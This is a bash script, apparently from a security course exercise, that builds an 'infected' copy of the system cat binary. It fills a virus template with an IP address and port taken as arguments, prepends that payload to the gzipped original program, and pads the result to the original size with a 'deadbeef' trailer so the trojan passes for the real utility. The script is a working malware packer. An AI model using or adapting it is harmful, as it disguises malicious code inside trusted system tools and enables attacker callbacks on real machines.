#! /usr/bin/bash

cat /home/csc2023/cat | gzip -r > ./cat.gz

cat ./catv \
		| perl -pe "s/xxx\.xxx\.xxx\.xxx/$1/g" \
		| perl -pe "s/yyyy/$2/g" \
		> ./catv_tmp

#mv ./catv_tmp ./catv

virus_size=$(stat -c "%s" ./catv_tmp)
comp_size=$(stat -c "%s" ./cat.gz)

cat ./catv_tmp \
		| perl -pe "s/#####/$comp_size/g" \
		| perl -pe "s/###/$virus_size/g" \
		> ./infected_cat

cat ./cat.gz >> ./infected_cat

orig_size=$(stat -c "%s" /home/csc2023/cat)
padding_size=$((orig_size-comp_size-virus_size-8))
dd if=/dev/zero bs=1 count=$padding_size >> ./infected_cat
echo -n "deadbeef" >> ./infected_cat
